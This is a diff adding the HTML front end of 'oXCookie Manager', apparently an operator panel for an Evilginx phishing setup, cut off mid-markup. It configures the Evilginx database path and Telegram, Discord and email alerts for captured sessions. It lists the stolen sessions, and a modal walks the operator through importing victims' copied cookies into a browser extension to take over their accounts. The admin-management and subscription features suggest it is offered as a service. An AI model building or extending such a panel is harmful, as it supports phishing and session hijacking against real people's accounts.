@@ -1,0 +1,2191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>oXCookie Manager</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            min-height: 100vh;
+            background: #0a0a0a;
+            background-image: 
+                radial-gradient(circle at 20% 50%, rgba(120, 119, 198, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(255, 119, 198, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 40% 20%, rgba(120, 219, 255, 0.1) 0%, transparent 50%);
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        /* Animated background */
+        body::before {
+            content: '';
+            position: fixed;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.03) 1px, transparent 1px);
+            background-size: 50px 50px;
+            animation: move 20s linear infinite;
+            z-index: 0;
+        }
+        
+        @keyframes move {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(50px, 50px); }
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+        }
+        
+        /* Glassmorphism Card - Black & Glassy */
+        .glass-card {
+            background: rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            margin-bottom: 20px;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.5);
+            transition: transform 0.3s, box-shadow 0.3s, border-color 0.3s;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .glass-card.header {
+            z-index: 998;
+        }
+        
+        .glass-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 40px 0 rgba(0, 0, 0, 0.7);
+            border-color: rgba(255, 255, 255, 0.2);
+        }
+        
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 20px;
+            position: relative;
+        }
+        
+        .header h1 {
+            color: white;
+            font-size: 28px;
+            font-weight: 700;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.2);
+        }
+        
+        .header p {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 14px;
+        }
+        
+        /* Hamburger Menu */
+        .hamburger {
+            display: none;
+            flex-direction: column;
+            cursor: pointer;
+            padding: 8px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            gap: 5px;
+            transition: all 0.3s;
+            position: relative;
+            z-index: 1000;
+        }
+        
+        .hamburger:hover {
+            background: rgba(0, 0, 0, 0.5);
+            border-color: rgba(255, 255, 255, 0.2);
+        }
+        
+        .hamburger span {
+            display: block;
+            width: 25px;
+            height: 3px;
+            background: white;
+            border-radius: 3px;
+            transition: all 0.3s;
+        }
+        
+        .hamburger.active span:nth-child(1) {
+            transform: rotate(45deg) translate(8px, 8px);
+        }
+        
+        .hamburger.active span:nth-child(2) {
+            opacity: 0;
+        }
+        
+        .hamburger.active span:nth-child(3) {
+            transform: rotate(-45deg) translate(7px, -7px);
+        }
+        
+        .header-actions {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        
+        .mobile-menu {
+            display: none;
+            position: absolute;
+            top: 100%;
+            left: 0;
+            right: 0;
+            margin-top: 10px;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            padding: 15px;
+            flex-direction: column;
+            gap: 10px;
+            z-index: 1001;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.5);
+        }
+        
+        .mobile-menu.active {
+            display: flex;
+        }
+        
+        .mobile-menu .logout-btn {
+            width: 100%;
+            text-align: center;
+            justify-content: center;
+        }
+        
+        .logout-btn {
+            padding: 10px 20px;
+            background: rgba(239, 68, 68, 0.2);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            border-radius: 10px;
+            color: white;
+            text-decoration: none;
+            font-weight: 500;
+            transition: all 0.3s;
+            backdrop-filter: blur(10px);
+        }
+        
+        .logout-btn:hover {
+            background: rgba(239, 68, 68, 0.3);
+            transform: translateY(-2px);
+        }
+        
+        .status-bar {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .status-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .status-indicator {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            transition: all 0.3s;
+        }
+        
+        .status-indicator.active {
+            background: #10b981;
+            box-shadow: 0 0 15px rgba(16, 185, 129, 0.6);
+        }
+        
+        .status-indicator.inactive {
+            background: #ef4444;
+            box-shadow: 0 0 15px rgba(239, 68, 68, 0.6);
+        }
+        
+        .status-item span {
+            color: white;
+            font-size: 14px;
+        }
+        
+        .status-item strong {
+            color: white;
+            font-weight: 600;
+        }
+        
+        .btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 600;
+            transition: all 0.3s;
+            backdrop-filter: blur(10px);
+            color: white;
+        }
+        
+        .btn-primary {
+            background: rgba(120, 119, 198, 0.2);
+            border: 1px solid rgba(120, 119, 198, 0.4);
+        }
+        
+        .btn-primary:hover {
+            background: rgba(120, 119, 198, 0.3);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(120, 119, 198, 0.4);
+        }
+        
+        .btn-danger {
+            background: rgba(239, 68, 68, 0.2);
+            border: 1px solid rgba(239, 68, 68, 0.4);
+        }
+        
+        .btn-danger:hover {
+            background: rgba(239, 68, 68, 0.3);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(239, 68, 68, 0.4);
+        }
+        
+        .btn-success {
+            background: rgba(16, 185, 129, 0.2);
+            border: 1px solid rgba(16, 185, 129, 0.4);
+        }
+        
+        .btn-success:hover {
+            background: rgba(16, 185, 129, 0.3);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(16, 185, 129, 0.4);
+        }
+        
+        .card h2 {
+            color: white;
+            margin-bottom: 20px;
+            font-size: 22px;
+            font-weight: 600;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.2);
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            color: rgba(255, 255, 255, 0.9);
+            margin-bottom: 8px;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 12px 16px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            color: white;
+            font-size: 14px;
+            transition: all 0.3s;
+            backdrop-filter: blur(10px);
+        }
+        
+        .form-group input::placeholder {
+            color: rgba(255, 255, 255, 0.5);
+        }
+        
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            background: rgba(0, 0, 0, 0.4);
+            border-color: rgba(120, 119, 198, 0.4);
+            box-shadow: 0 0 0 3px rgba(120, 119, 198, 0.2);
+        }
+        
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+        
+        .toggle-switch {
+            position: relative;
+            display: inline-block;
+            width: 50px;
+            height: 24px;
+            margin-left: 10px;
+        }
+        
+        .toggle-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.3);
+            transition: .4s;
+            border-radius: 24px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 18px;
+            width: 18px;
+            left: 2px;
+            bottom: 2px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+        
+        .toggle-switch input:checked + .slider {
+            background-color: rgba(120, 119, 198, 0.5);
+        }
+        
+        .toggle-switch input:checked + .slider:before {
+            transform: translateX(26px);
+        }
+        
+        .alert {
+            padding: 15px 20px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            display: none;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .alert.success {
+            background: rgba(16, 185, 129, 0.2);
+            color: #d1fae5;
+        }
+        
+        .alert.error {
+            background: rgba(239, 68, 68, 0.2);
+            color: #fee2e2;
+        }
+        
+        .sessions-list {
+            max-height: 500px;
+            overflow-y: auto;
+            padding-right: 10px;
+        }
+        
+        .sessions-list::-webkit-scrollbar {
+            width: 6px;
+        }
+        
+        .sessions-list::-webkit-scrollbar-track {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+        }
+        
+        .sessions-list::-webkit-scrollbar-thumb {
+            background: rgba(120, 119, 198, 0.4);
+            border-radius: 10px;
+        }
+        
+        .session-item {
+            padding: 15px;
+            margin-bottom: 10px;
+            background: rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+        
+        .session-item:hover {
+            background: rgba(255, 255, 255, 0.15);
+            transform: translateX(5px);
+        }
+        
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 2000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(5px);
+            animation: fadeIn 0.3s;
+            overflow-y: auto;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        /* Session Modal - Lower z-index */
+        #sessionModal {
+            z-index: 2000;
+        }
+        
+        .modal-content {
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(20px);
+            margin: 2% auto;
+            padding: 30px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            width: 90%;
+            max-width: 800px;
+            max-height: 90vh;
+            overflow-y: auto;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.7);
+            animation: slideDown 0.3s;
+            position: relative;
+        }
+        
+        @keyframes slideDown {
+            from { transform: translateY(-50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        /* Cookie Import Modal - Much higher z-index to appear above session modal */
+        #cookieImportModal {
+            z-index: 5000 !important;
+        }
+        
+        #cookieImportModal.show,
+        #cookieImportModal[style*="display: block"] {
+            display: block !important;
+            visibility: visible !important;
+            opacity: 1 !important;
+            z-index: 5000 !important;
+            background: rgba(0, 0, 0, 0.85) !important;
+        }
+        
+        #cookieImportModal .modal-content {
+            max-width: 600px;
+            margin: 5% auto;
+            position: relative;
+            z-index: 5001 !important;
+            background: rgba(0, 0, 0, 0.6) !important;
+            backdrop-filter: blur(20px) !important;
+        }
+        
+        #cookieImportModal .modal-body a {
+            display: inline-flex !important;
+            visibility: visible !important;
+            opacity: 1 !important;
+            pointer-events: auto !important;
+            position: relative !important;
+            z-index: 10 !important;
+        }
+        
+        #cookieImportModal .modal-body > div > div:first-child {
+            display: flex !important;
+            flex-wrap: wrap !important;
+        }
+        
+        #cookieImportModal .modal-body > div > div:last-child {
+            display: flex !important;
+            visibility: visible !important;
+        }
+        
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .modal-header h2 {
+            color: white;
+            margin: 0;
+            font-size: 24px;
+        }
+        
+        .close {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .close:hover {
+            color: white;
+            transform: scale(1.2);
+        }
+        
+        .modal-body {
+            color: white;
+        }
+        
+        .detail-row {
+            margin-bottom: 15px;
+            padding: 12px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .detail-label {
+            font-weight: 600;
+            color: rgba(255, 255, 255, 0.9);
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+        
+        .detail-value {
+            color: rgba(255, 255, 255, 0.8);
+            word-break: break-all;
+            font-size: 13px;
+        }
+        
+        .cookies-section {
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .cookies-textarea {
+            width: 100%;
+            min-height: 150px;
+            padding: 12px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            color: white;
+            font-family: monospace;
+            font-size: 12px;
+            resize: vertical;
+            margin-bottom: 10px;
+        }
+        
+        .cookies-textarea:focus {
+            outline: none;
+            border-color: rgba(255, 255, 255, 0.4);
+        }
+        
+        .copy-btn {
+            padding: 10px 20px;
+            background: rgba(102, 126, 234, 0.3);
+            border: 1px solid rgba(102, 126, 234, 0.5);
+            border-radius: 10px;
+            color: white;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s;
+            backdrop-filter: blur(10px);
+        }
+        
+        .copy-btn:hover {
+            background: rgba(102, 126, 234, 0.4);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.3);
+        }
+        
+        .copy-btn:active {
+            transform: translateY(0);
+        }
+        
+        .copy-success {
+            background: rgba(16, 185, 129, 0.3) !important;
+            border-color: rgba(16, 185, 129, 0.5) !important;
+        }
+        
+        .session-item:last-child {
+            margin-bottom: 0;
+        }
+        
+        .session-info {
+            color: white;
+        }
+        
+        .session-info strong {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 15px;
+        }
+        
+        .session-info small {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 12px;
+        }
+        
+        .session-badge {
+            padding: 6px 12px;
+            background: rgba(16, 185, 129, 0.2);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            border-radius: 8px;
+            color: #d1fae5;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        
+        .section-title {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 16px;
+            font-weight: 600;
+            margin: 25px 0 15px 0;
+        }
+        
+        .control-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            body {
+                padding: 10px;
+            }
+            
+            .container {
+                max-width: 100%;
+            }
+            
+            .glass-card {
+                padding: 20px;
+                margin-bottom: 15px;
+            }
+            
+            .header {
+                flex-direction: row;
+                align-items: center;
+                gap: 15px;
+            }
+            
+            .hamburger {
+                display: flex !important;
+                position: relative !important;
+                z-index: 1000 !important;
+            }
+            
+            .header-actions {
+                display: none;
+            }
+            
+            .header h1 {
+                font-size: 24px;
+            }
+            
+            .header > div:first-child {
+                flex: 1;
+                position: relative;
+                z-index: 999;
+            }
+            
+            .glass-card.header {
+                z-index: 998 !important;
+                position: relative;
+            }
+            
+            .status-bar {
+                grid-template-columns: 1fr;
+            }
+            
+            .form-row {
+                grid-template-columns: 1fr;
+            }
+            
+            .modal-content {
+                width: 95%;
+                margin: 10% auto;
+                padding: 20px;
+                max-height: 85vh;
+            }
+            
+            .modal-header h2 {
+                font-size: 20px;
+            }
+            
+            .detail-row {
+                flex-direction: column;
+                gap: 8px;
+            }
+            
+            .cookies-textarea {
+                font-size: 11px;
+                min-height: 120px;
+            }
+            
+            .sessions-list {
+                max-height: 400px;
+            }
+            
+            .session-item {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 10px;
+            }
+            
+            #cookieImportModal .modal-content {
+                width: 95%;
+                margin: 5% auto;
+                padding: 20px;
+            }
+            
+            #cookieImportModal .modal-body {
+                padding: 15px;
+            }
+            
+            #cookieImportModal .modal-body h3 {
+                font-size: 14px;
+            }
+            
+            #cookieImportModal .modal-body ol {
+                font-size: 13px;
+                line-height: 1.6;
+            }
+            
+            #cookieImportModal .modal-body a {
+                font-size: 11px !important;
+                padding: 5px 10px !important;
+            }
+            
+            #cookieImportModal .modal-body h3 {
+                font-size: 14px !important;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .header h1 {
+                font-size: 18px;
+            }
+            
+            .header p {
+                font-size: 12px;
+            }
+            
+            .hamburger {
+                padding: 6px;
+                z-index: 1000 !important;
+                position: relative !important;
+            }
+            
+            .hamburger span {
+                width: 20px;
+                height: 2px;
+            }
+            
+            .mobile-menu {
+                padding: 12px;
+                z-index: 1001 !important;
+            }
+            
+            .glass-card.header {
+                z-index: 998 !important;
+            }
+            
+            .glass-card {
+                padding: 15px;
+            }
+            
+            .modal-content {
+                padding: 15px;
+                border-radius: 15px;
+            }
+            
+            .modal-header h2 {
+                font-size: 18px;
+            }
+            
+            .btn {
+                padding: 10px 16px;
+                font-size: 13px;
+            }
+            
+            .logout-btn {
+                padding: 8px 12px;
+                font-size: 12px;
+            }
+            
+            #user-role-badge {
+                padding: 6px 12px;
+                font-size: 10px;
+            }
+            
+            .cookies-textarea {
+                font-size: 10px;
+                padding: 10px;
+            }
+            
+            #cookieImportModal .modal-content {
+                padding: 15px;
+            }
+            
+            #cookieImportModal .modal-body {
+                padding: 10px;
+            }
+            
+            #cookieImportModal .modal-body a {
+                font-size: 10px !important;
+                padding: 4px 8px !important;
+            }
+            
+            #cookieImportModal .modal-body > div > div:first-child {
+                flex-direction: column !important;
+                gap: 10px !important;
+            }
+            
+            #cookieImportModal .modal-body > div > div:last-child {
+                width: 100%;
+                justify-content: center;
+            }
+        }
+        
+        @media (min-width: 1400px) {
+            .container {
+                max-width: 1600px;
+            }
+            
+            .modal-content {
+                max-width: 900px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="glass-card header">
+            <div style="display: flex; align-items: center; gap: 15px; flex: 1;">
+                <div class="hamburger" id="hamburger" onclick="toggleMobileMenu()">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+                <div>
+                    <h1>🍪 oXCookie Manager</h1>
+                    <p>Advanced cookie extraction and session management system</p>
+                </div>
+            </div>
+            <div class="header-actions">
+                <span id="user-role-badge" style="padding: 8px 16px; background: rgba(120, 119, 198, 0.2); border: 1px solid rgba(120, 119, 198, 0.4); border-radius: 10px; color: white; font-size: 12px; font-weight: 600; text-transform: uppercase;"></span>
+                <a href="/notifications" id="notifications-btn" class="logout-btn" style="background: rgba(139, 92, 246, 0.3); border-color: rgba(139, 92, 246, 0.5); display: none;">🔔 Notifications</a>
+                <a href="/manage-admins" id="manage-admins-btn" class="logout-btn" style="background: rgba(255, 193, 7, 0.3); border-color: rgba(255, 193, 7, 0.5); display: none;">👥 Manage Admins</a>
+                <a href="/database-viewer" id="db-viewer-btn" class="logout-btn" style="background: rgba(16, 185, 129, 0.3); border-color: rgba(16, 185, 129, 0.5); display: none;">📊 Database Viewer</a>
+                <a href="/logout" class="logout-btn">Logout</a>
+            </div>
+            <div class="mobile-menu" id="mobile-menu">
+                <span id="user-role-badge-mobile" style="padding: 8px 16px; background: rgba(120, 119, 198, 0.2); border: 1px solid rgba(120, 119, 198, 0.4); border-radius: 10px; color: white; font-size: 12px; font-weight: 600; text-transform: uppercase; text-align: center; display: block;"></span>
+                <a href="/notifications" id="notifications-btn-mobile" class="logout-btn" style="background: rgba(139, 92, 246, 0.3); border-color: rgba(139, 92, 246, 0.5); display: none;">🔔 Notifications</a>
+                <a href="/manage-admins" id="manage-admins-btn-mobile" class="logout-btn" style="background: rgba(255, 193, 7, 0.3); border-color: rgba(255, 193, 7, 0.5); display: none;">👥 Manage Admins</a>
+                <a href="/database-viewer" id="db-viewer-btn-mobile" class="logout-btn" style="background: rgba(16, 185, 129, 0.3); border-color: rgba(16, 185, 129, 0.5); display: none;">📊 Database Viewer</a>
+                <a href="/logout" class="logout-btn">Logout</a>
+            </div>
+        </div>
+
+        <div id="alert" class="alert"></div>
+        
+        <!-- Maintenance Message Banner (for normal admins) -->
+        <div id="maintenance-banner" class="glass-card" style="display: none; background: rgba(255, 193, 7, 0.2); border-color: rgba(255, 193, 7, 0.4); margin-bottom: 20px;">
+            <div style="display: flex; align-items: center; gap: 15px;">
+                <span style="font-size: 24px;">⚠️</span>
+                <div style="flex: 1;">
+                    <strong style="color: #ffc107; display: block; margin-bottom: 5px;">Maintenance Notice</strong>
+                    <div id="maintenance-message-text" style="color: rgba(255, 255, 255, 0.9);"></div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Subscription Countdown (for normal admins) -->
+        <div id="subscription-countdown" class="glass-card" style="display: none; background: rgba(120, 119, 198, 0.2); border-color: rgba(120, 119, 198, 0.4); margin-bottom: 20px;">
+            <div style="display: flex; align-items: center; gap: 15px;">
+                <span style="font-size: 24px;">⏰</span>
+                <div style="flex: 1;">
+                    <strong style="color: #c4b5fd; display: block; margin-bottom: 5px;">Subscription Status</strong>
+                    <div id="subscription-countdown-text" style="color: rgba(255, 255, 255, 0.9); font-size: 16px; font-weight: 600;"></div>
+                    <div id="subscription-countdown-timer" style="color: rgba(255, 255, 255, 0.7); font-size: 14px; margin-top: 5px;"></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="glass-card">
+            <div class="status-bar">
+                <div class="status-item">
+                    <span class="status-indicator" id="monitoring-indicator"></span>
+                    <span>Monitoring: <strong id="monitoring-status">Unknown</strong></span>
+                </div>
+                <div class="status-item">
+                    <span class="status-indicator" id="telegram-indicator"></span>
+                    <span>Telegram: <strong id="telegram-status">Unknown</strong></span>
+                </div>
+                <div class="status-item">
+                    <span class="status-indicator" id="discord-indicator"></span>
+                    <span>Discord: <strong id="discord-status">Unknown</strong></span>
+                </div>
+                <div class="status-item">
+                    <span class="status-indicator" id="email-indicator"></span>
+                    <span>Email: <strong id="email-status">Unknown</strong></span>
+                </div>
+            </div>
+            
+            <div class="control-buttons">
+                <button class="btn btn-primary" onclick="startMonitoring()">▶ Start Monitoring</button>
+                <button class="btn btn-danger" onclick="stopMonitoring()">⏹ Stop Monitoring</button>
+            </div>
+        </div>
+
+        <div class="glass-card" id="config-section" style="display: none;">
+            <h2>⚙️ Configuration</h2>
+            <form id="config-form">
+                <div class="form-group">
+                    <label>Database File Path</label>
+                    <input type="text" id="db-path" placeholder="/root/.evilginx/data.db" required>
+                </div>
+
+                <div class="section-title">Telegram Settings</div>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Telegram Token</label>
+                        <input type="text" id="tele-token" placeholder="Bot token">
+                    </div>
+                    <div class="form-group">
+                        <label>Chat ID</label>
+                        <input type="text" id="tele-chatid" placeholder="Chat ID">
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>
+                        Enable Telegram Notifications
+                        <span class="toggle-switch">
+                            <input type="checkbox" id="tele-enable">
+                            <span class="slider"></span>
+                        </span>
+                    </label>
+                </div>
+
+                <div class="section-title">Discord Settings</div>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>Discord Token</label>
+                        <input type="text" id="discord-token" placeholder="Bot token">
+                    </div>
+                    <div class="form-group">
+                        <label>Chat ID</label>
+                        <input type="text" id="discord-chatid" placeholder="User ID">
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>
+                        Enable Discord Notifications
+                        <span class="toggle-switch">
+                            <input type="checkbox" id="discord-enable">
+                            <span class="slider"></span>
+                        </span>
+                    </label>
+                </div>
+
+                <div class="section-title">Email Settings</div>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>SMTP Host</label>
+                        <input type="text" id="mail-host" placeholder="smtp.gmail.com">
+                    </div>
+                    <div class="form-group">
+                        <label>SMTP Port</label>
+                        <input type="number" id="mail-port" placeholder="587">
+                    </div>
+                </div>
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>SMTP User</label>
+                        <input type="text" id="mail-user" placeholder="your-email@gmail.com">
+                    </div>
+                    <div class="form-group">
+                        <label>SMTP Password</label>
+                        <input type="password" id="mail-password" placeholder="Password">
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>To Email</label>
+                    <input type="email" id="mail-to" placeholder="recipient@example.com">
+                </div>
+                <div class="form-group">
+                    <label>
+                        Enable Email Notifications
+                        <span class="toggle-switch">
+                            <input type="checkbox" id="mail-enable">
+                            <span class="slider"></span>
+                        </span>
+                    </label>
+                </div>
+
+                <button type="submit" class="btn btn-success" style="margin-top: 20px;">💾 Save Configuration</button>
+            </form>
+        </div>
+
+        <div class="glass-card">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+                <h2 style="margin: 0;">📊 Recent Sessions</h2>
+                <button class="btn btn-primary" onclick="refreshSessions()" style="padding: 10px 20px;">
+                    🔄 Refresh All Logs
+                </button>
+            </div>
+            <div class="sessions-list" id="sessions-list">
+                <p style="color: rgba(255,255,255,0.7); text-align: center; padding: 20px;">Loading sessions...</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Session Details Modal -->
+    <div id="sessionModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>Session Details</h2>
+                <span class="close" onclick="closeModal()">&times;</span>
+            </div>
+            <div class="modal-body" id="modalBody">
+                <!-- Content will be inserted here -->
+            </div>
+        </div>
+    </div>
+    
+    <!-- Cookie Import Instructions Modal -->
+    <div id="cookieImportModal" class="modal">
+        <div class="modal-content" style="max-width: 600px;">
+            <div class="modal-header">
+                <h2>📥 How to Import Cookies</h2>
+                <span class="close" onclick="closeCookieImportModal()">&times;</span>
+            </div>
+            <div class="modal-body" style="color: white; padding: 20px;">
+                <p style="margin-bottom: 20px; color: rgba(255,255,255,0.9);">Your cookies have been copied to clipboard! Here's how to import them using a browser extension:</p>
+                
+                <div style="background: rgba(0, 0, 0, 0.3); padding: 15px; border-radius: 12px; margin-bottom: 15px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; flex-wrap: wrap; gap: 10px;">
+                        <h3 style="color: #c4b5fd; margin: 0; font-size: 16px; flex: 1; min-width: 200px;">Method 1: Cookie-Editor Extension</h3>
+                        <div style="display: flex !important; gap: 8px; flex-shrink: 0; visibility: visible !important;">
+                            <a id="cookie-editor-chrome-link" href="https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm" target="_blank" rel="noopener noreferrer" style="padding: 6px 12px !important; background: rgba(66, 133, 244, 0.3) !important; border: 1px solid rgba(66, 133, 244, 0.5) !important; border-radius: 8px !important; color: white !important; text-decoration: none !important; font-size: 12px !important; font-weight: 600 !important; transition: all 0.3s !important; display: inline-flex !important; align-items: center !important; gap: 5px !important; visibility: visible !important; opacity: 1 !important; pointer-events: auto !important; position: relative !important; z-index: 10 !important;" onmouseover="this.style.background='rgba(66, 133, 244, 0.5)'; this.style.borderColor='rgba(66, 133, 244, 0.7)'" onmouseout="this.style.background='rgba(66, 133, 244, 0.3)'; this.style.borderColor='rgba(66, 133, 244, 0.5)'">
+                                🌐 Chrome
+                            </a>
+                            <a id="cookie-editor-firefox-link" href="https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/" target="_blank" rel="noopener noreferrer" style="padding: 6px 12px !important; background: rgba(255, 149, 0, 0.3) !important; border: 1px solid rgba(255, 149, 0, 0.5) !important; border-radius: 8px !important; color: white !important; text-decoration: none !important; font-size: 12px !important; font-weight: 600 !important; transition: all 0.3s !important; display: inline-flex !important; align-items: center !important; gap: 5px !important; visibility: visible !important; opacity: 1 !important; pointer-events: auto !important; position: relative !important; z-index: 10 !important;" onmouseover="this.style.background='rgba(255, 149, 0, 0.5)'; this.style.borderColor='rgba(255, 149, 0, 0.7)'" onmouseout="this.style.background='rgba(255, 149, 0, 0.3)'; this.style.borderColor='rgba(255, 149, 0, 0.5)'">
+                                🦊 Firefox
+                            </a>
+                        </div>
+                    </div>
+                    <ol style="color: rgba(255,255,255,0.8); line-height: 1.8; padding-left: 20px; margin: 0;">
+                        <li>Install <strong>Cookie-Editor</strong> extension using the buttons above</li>
+                        <li>Click the extension icon in your browser</li>
+                        <li>Click <strong>"Import"</strong> button</li>
+                        <li>Paste the copied JSON (Ctrl+V / Cmd+V)</li>
+                        <li>Click <strong>"Import"</strong> to apply cookies</li>
+                    </ol>
+                </div>
+                
+                <div style="background: rgba(0, 0, 0, 0.3); padding: 15px; border-radius: 12px; margin-bottom: 15px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; flex-wrap: wrap; gap: 10px;">
+                        <h3 style="color: #c4b5fd; margin: 0; font-size: 16px; flex: 1; min-width: 200px;">Method 2: EditThisCookie Extension</h3>
+                        <div style="display: flex !important; gap: 8px; flex-shrink: 0; visibility: visible !important;">
